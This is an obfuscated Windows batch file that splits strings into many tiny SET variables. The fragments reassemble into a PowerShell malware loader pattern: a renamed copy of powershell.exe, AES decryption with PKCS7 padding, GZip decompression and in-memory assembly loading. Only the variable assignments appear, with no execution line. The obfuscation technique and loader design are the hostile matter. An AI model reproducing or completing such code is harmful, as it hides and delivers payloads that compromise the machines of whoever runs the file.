@echo off
set "fJBKigEMiX=.e"
set "ZxOdVFskYO=32"
set "bDBMnRgLux=\v"
set "DSRBtTFhGA=Sy"
set "QRQlIfkqCy=nd"
set "HKOcrTpWii=\W"
set "ENJyvnjdDW=xe"
set "aSZadiNEzJ=in"
set "PsGqRYlXBs=co"
set "KvtoFQfuvQ=:\"
set "ykLrHmRuCX=ow"
set "VpZMBiaObN=do"
set "jKjgxHNFzR=0\"
set "wufmbJXpiU=em"
set "dAmCSWDgum=he"
set "JyahurtvoF=rs"
set "CKJrqUiZSu=he"
set "fAEvOoPHkK=Wi"
set "KwKRQBiBXH= /"
set "CDoZUMGcVh=ws"
set "mFieAuYBuL=y "
set "ROLoSrKcBi=we"
set "EFUCoYjXdy=po"
set "BxIJkhetYY=1."
set "IlJhNNBpsi=py"
set "IhTBdOfNCz=s\"
set "TBUvFwEafq=rS"
set "FORXsVOnNB=st"
set "XhpzkMfOnk=ll"
set "LlOoVORZgD=ll"
set "oKiqNtAblj= C"
set "tbhZTgxOaM=Po"
set "OwFvTnCeeO=we"
set "ttNGkKznCG=cd"
set "FNvBFNafEZ= %~dp0"
set "YgippYKEhZ=v = "
set "OqWMLZJOVN=ew-O"
set "NTxFqwKRkZ=New-"
set "iLZRqHzRIp= New"
set "gzOPxSkVBA=m.IO"
set "WSRKrfxtet=ecry"
set "phEQyeGMEh=AmDh"
set "ePEbnwmSvB=ct S"
set "JecNHMTfec=morF"
set "agvWpdxRWa=.Cry"
set "hJJCHnVEos=ach "
set "DhJjWqiXJJ=isfL"
set "JJsJPLVHwl=K) {"
set "XaBstICYTg=iron"
set "VWsaVaCCNW=sion"
set "guZyUreKJC=saBm"
set "NLOhRDtHEL=$iMK"
set "UJUEDfsiIX=ress"
set "azRzxIaGni=hy.A"
set "zgzohEeall=::('"
set "KpbjcRTOyI=le  "
set "ZZJaPfbMzF=)($A"
set "DIQMTjxiYI=HptE"
set "ZqQgYbRoyf=rity"
set "QaDCbkwusk=-nop"
set "oEhOiWqXDy=ypto"
set "vkIhuBmfvF=nP.T"
set "UdXZYgXzCa=1] -"
set "XQZxZXqvsF=7Yiv"
set "fyhYwQmhHW=pher"
set "oXOijlnDQn=('da"
set "HtNUmMWoWK=oryS"
set "oqFNgdYrNp=rt]:"
set "otUVUDnUsr=.Dis"
set "GokZkOeTyf=-joi"
set "jGKXDBYtzk=ss -"
set "nlswxFXOpK=hjuX"
set "CyXmkQJwHE=ddin"
set "EgpbVcfiyk=w = "
set "nOmMmWfHBe=.Cry"
set "QftvoIHfQS= '')"
set "DlmqRZucTy=PXy "
set "fjkcqXLgBL=form"
set "uNKjFdjINP=;$SF"
set "DdacoLbRle=daeR"
set "iNSlQwLBYc=6] -"
set "gCwfIYsGNt='dqR"
set "RaMtvQwyMG=hz ="
set "kXBRLBubSw='txe"
set "YgEquMEGqA=yste"
set "MeqTTXLbJr=('l0"
set "SqGwZEDFqb=Ow.D"
set "rFIEtAKmTQ=PKCS"
set "XLqUmnJimA=gnir"
set "uXcaJUyDlN=.Ass"
set "iTiEUZMyxL=.Sec"
set "sVrGTTRBgy=.Len"
set "UZzSlpNwpV=$SFO"
set "RNqMosQxMy=oArr"
set "HUjrJwmrPS=6esa"
set "jKYdqNiSDP=] -j"
set "QpJsBfpChe=;$Sq"
set "keEQSAPKKo=Syst"
set "DxHgmMmHcH=brea"
set "RUFSpFbnkn=[Sys"
set "SBJVFtVEBL=eam("
set "wpUhzwjQDG=n.Pa"
set "FsJTjSugPu=.IO."
set "iQQXUeJicr=RXMn"
set "YbXhgaEyjR=WDW."
set "ivQodnDyMF=-Obj"
set "UsdaeVVPrW=[IO."
set "zASBqMKqlI=y.Cr"
set "zYMPQtNhEr=Comp"
set "DuiLzJLMpb=();$"
set "YbMknHauxv=grap"
set "UuUAuqAUgq=SFOm"
set "UQmMWbFLTE=gth)"
set "HhVbczrrkd=stem"
set "VytEqLaJlF=pres"
set "mHJpalktFh=ddin"
set "AVmiRntzTI=$iMK"
set "fkveGXLxEe=stem"
set "fpafmAaKHs=zzPX"
set "mAgMYghDfW=$SqZ"
set "siFBSQpgBt=Stre"
set "htCUbSnXKa=raph"
set "UNHgHclJxD=)($o"
set "SBErxhxqrk=Obje"
set "DytpjRmoUQ=-1.."
set "qHWJqtKFhw=comm"
